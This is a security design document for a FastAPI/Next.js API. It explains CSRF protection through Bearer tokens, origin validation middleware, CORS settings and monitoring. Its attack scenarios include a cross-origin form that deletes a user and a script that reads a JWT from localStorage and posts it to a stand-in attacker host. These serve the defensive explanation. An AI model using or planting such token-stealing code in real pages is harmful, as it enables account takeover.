# CSRF Protection Strategy

## Overview

This API uses **Bearer token authentication** with JWT tokens sent via the `Authorization` header. This architecture provides **natural CSRF protection** because browsers do not automatically send `Authorization` headers in cross-origin requests.

## Why Traditional CSRF Protection Isn't Needed

### Traditional CSRF Vulnerability
In traditional web applications:
- Authentication uses **session cookies**
- Browsers **automatically** send cookies with every request
- Attackers can make users' browsers send authenticated requests to the API
- CSRF tokens are needed to verify requests originate from the legitimate frontend

### This API's Protection
In this Bearer token API:
- Authentication uses **JWT tokens in Authorization headers**
- Browsers **do NOT automatically** send Authorization headers
- Attackers **cannot** make browsers send the JWT token cross-origin
- Therefore, CSRF attacks are **not possible** in the traditional sense

## Defense-in-Depth Measures

While Bearer authentication provides natural CSRF protection, we implement additional security layers:

### 1. Origin Validation Middleware (`OriginValidatorMiddleware`)

**What it does:**
- Validates `Origin` and `Referer` headers on state-changing requests (POST, PUT, PATCH, DELETE)
- Blocks requests from unauthorized origins
- Requires origin headers for sensitive endpoints (password changes, user management, etc.)

**Configuration:**
```python
# In settings
CORS_ORIGINS = "http://localhost:3000,https://yourdomain.com"
```

**Strict Validation Paths:**
- `/auth/change-password`
- `/auth/reset-password`
- `/users`
- `/workflows`
- `/api-keys`
- `/teams`

### 2. CORS Configuration

**Properly configured CORS:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins_list,  # NEVER "*" in production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Important:** Never use `allow_origins=["*"]` in production with `allow_credentials=True`.

### 3. SameSite Cookie Attribute (If Cookies Are Used)

If the frontend ever stores tokens in cookies:
```python
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,
    secure=True,  # HTTPS only
    samesite="strict",  # Prevent cross-site cookie sending
)
```

**Note:** Currently, this API does NOT use cookie-based authentication.

## Security Best Practices

### Frontend (Next.js)

**✅ DO:**
- Store JWT tokens in memory (React state)
- Use `localStorage` or `sessionStorage` only if necessary
- Send tokens in `Authorization: Bearer <token>` header
- Handle token refresh properly
- Implement token expiration handling

**❌ DON'T:**
- Store tokens in cookies without proper configuration
- Use `localStorage` for highly sensitive applications (XSS risk)
- Include tokens in URL query parameters
- Send tokens via form data

### Backend (FastAPI)

**✅ DO:**
- Use Bearer token authentication (implemented)
- Validate Origin/Referer headers (implemented)
- Set proper CORS configuration (implemented)
- Use HTTPS in production (required)
- Implement rate limiting (implemented)
- Log suspicious requests (implemented)

**❌ DON'T:**
- Accept tokens from query parameters or form data
- Allow `*` for CORS origins in production
- Skip origin validation on sensitive endpoints
- Use session cookies without SameSite attribute

## Attack Scenarios

### Scenario 1: Traditional CSRF Attack

**Attack:** Attacker creates malicious website with form that POSTs to API
```html
<form action="https://api.example.com/users/123/delete" method="POST">
  <input type="submit" value="Click here!">
</form>
```

**Protection:**
- Browser will NOT include `Authorization` header
- Request will be rejected with 401 Unauthorized
- Origin validation will block cross-origin POST

### Scenario 2: XSS + Token Theft

**Attack:** Attacker injects JavaScript to steal JWT from localStorage
```javascript
// Malicious script
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal', { method: 'POST', body: token });
```

**Protection:**
- Use Content Security Policy (CSP) headers
- Sanitize all user input
- Use React's built-in XSS protection
- Consider storing tokens in memory only
- Implement token rotation

### Scenario 3: Login CSRF

**Attack:** Attacker logs victim into attacker's account
- Not possible with Bearer tokens
- Login requires OTP verification
- Origin validation prevents cross-origin login

## Testing CSRF Protection

Run the test suite:
```bash
cd apps/backend
pytest tests/test_csrf_protection.py -v
```

## Configuration

### Development
```env
CORS_ORIGINS=http://localhost:3000,http://localhost:8000
```

### Production
```env
CORS_ORIGINS=https://app.yourdomain.com,https://yourdomain.com
```

## Monitoring

Monitor for suspicious activity:
- Multiple requests from unexpected origins
- Requests with missing/invalid Origin headers
- Rate limit violations
- Failed authentication attempts

Check logs for:
```
"Blocked request from unauthorized origin"
"missing Origin or Referer header"
```

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [JWT Authentication Best Practices](https://tools.ietf.org/html/rfc8725)
- [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
